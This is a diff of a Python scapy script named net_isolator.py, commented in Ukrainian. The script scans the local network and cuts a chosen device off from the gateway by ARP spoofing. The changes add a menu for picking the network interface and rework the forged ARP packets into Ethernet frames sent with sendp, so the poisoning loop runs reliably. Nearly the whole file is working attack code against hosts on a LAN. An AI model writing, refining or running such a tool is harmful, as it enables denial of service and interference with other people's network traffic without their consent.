@@ -1,14 +1,16 @@
-# Файл: net_isolator.py (ФІНАЛЬНА ВЕРСІЯ - ТІЛЬКИ КОД)
+# Файл: net_isolator.py (ФІНАЛЬНА ВЕРСІЯ БЕЗ ПОПЕРЕДЖЕНЬ)
 
-from scapy.all import srp, Ether, ARP, send 
+from scapy.all import srp, Ether, ARP, send, conf, sendp # ДОДАНО sendp
 import time
 import sys
 import os
 import ctypes
-try:
-    import netifaces
-except Exception:
-    netifaces = None
+import netifaces 
+
+# Глобальна змінна для зберігання вибраного інтерфейсу
+SELECTED_INTERFACE = None 
+
+# --- ДОПОМІЖНІ ФУНКЦІЇ ---
 
 def get_gateway_ip():
     if netifaces:
@@ -40,9 +42,46 @@ def get_gateway_ip():
     print("❌ Не вдалося отримати IP-адресу шлюзу.")
     return None
 
+def select_interface():
+    """Виводить список інтерфейсів і просить користувача вибрати один."""
+    global SELECTED_INTERFACE
+    
+    iface_list = list(conf.ifaces.keys())
+    
+    if not iface_list:
+        print("❌ Не знайдено доступних мережевих інтерфейсів.")
+        sys.exit(1)
+
+    print("\n--- Вибір мережевого інтерфейсу ---")
+    for i, name in enumerate(iface_list):
+        try:
+             ip = conf.ifaces[name].ip
+        except:
+             ip = "N/A"
+             
+        print(f"  [{i+1}] {name} (IP: {ip})")
+    print("-----------------------------------")
+    
+    try:
+        choice = input("Введіть номер інтерфейсу для роботи: ")
+        choice_num = int(choice) - 1
+        
+        if 0 <= choice_num < len(iface_list):
+            SELECTED_INTERFACE = iface_list[choice_num]
+            print(f"✅ Вибрано інтерфейс: {SELECTED_INTERFACE}")
+            return True
+        else:
+            print("❌ Невірний номер. Вихід.")
+            return False
+            
+    except ValueError:
+        print("❌ Невірний ввід. Потрібно ввести число.")
+        return False
+
+
 def get_mac(ip):
     arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
-    answered, unanswered = srp(arp_request, timeout=1, verbose=False)
+    answered, unanswered = srp(arp_request, timeout=1, verbose=False, iface=SELECTED_INTERFACE) 
     
     if answered:
         return answered[0][1].hwsrc
@@ -52,7 +91,7 @@ def scan_network(target_ip_range):
     print(f"⏳ Сканування мережі {target_ip_range}...")
     
     arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip_range)
-    answered, unanswered = srp(arp_request, timeout=2, verbose=False)
+    answered, unanswered = srp(arp_request, timeout=2, verbose=False, iface=SELECTED_INTERFACE)
     
     devices = {}
     for sent, received in answered:
@@ -63,9 +102,11 @@ def scan_network(target_ip_range):
 def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
     print("\n[Cleanup] Відновлення ARP-таблиці цілі...")
     
-    packet1 = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
+    arp_layer = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
+    packet1 = Ether(src=gateway_mac, dst=target_mac) / arp_layer
     
-    send(packet1, count=4, verbose=False)
+    # ВИПРАВЛЕНО: Використовуємо sendp
+    sendp(packet1, count=4, verbose=False, iface=SELECTED_INTERFACE)
     
     print("✅ ARP-таблицю відновлено.")
 
@@ -80,11 +121,13 @@ def isolate_target(target_ip, target_mac, gateway_ip):
     
     fake_mac = "00:11:22:33:44:55"
     
-    arp_poison_packet = ARP(op=2, psrc=gateway_ip, hwsrc=fake_mac, pdst=target_ip, hwdst=target_mac)
+    # ВИПРАВЛЕНО: Використовуємо Ether(src=fake_mac, dst=target_mac) для усунення попереджень
+    arp_poison_packet = Ether(src=fake_mac, dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=fake_mac, pdst=target_ip, hwdst=target_mac)
 
     try:
         while True:
-            send(arp_poison_packet, verbose=False) 
+            # ВИПРАВЛЕНО: Використовуємо sendp для коректної відправки L2-пакетів
+            sendp(arp_poison_packet, verbose=False, iface=SELECTED_INTERFACE) 
             time.sleep(2) 
 
     except KeyboardInterrupt:
@@ -103,19 +146,18 @@ def isolate_target(target_ip, target_mac, gateway_ip):
 
 def main():
     if sys.platform == 'win32':
-      
         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
     else:
-      
         is_admin = (os.geteuid() == 0)
 
     if not is_admin:
         print("🛑 Для надсилання ARP-пакетів потрібні права адміністратора.")
         print("Будь ласка, запустіть скрипт від імені адміністратора (Run as Administrator).")
         sys.exit(1)
+    
+    if not select_interface():
+        return
         
-    gateway_ip = get_gateway_ip()
-
     gateway_ip = get_gateway_ip()
     if not gateway_ip:
         return
@@ -165,4 +207,3 @@ def main():
         
 if __name__ == "__main__":
     main()
-
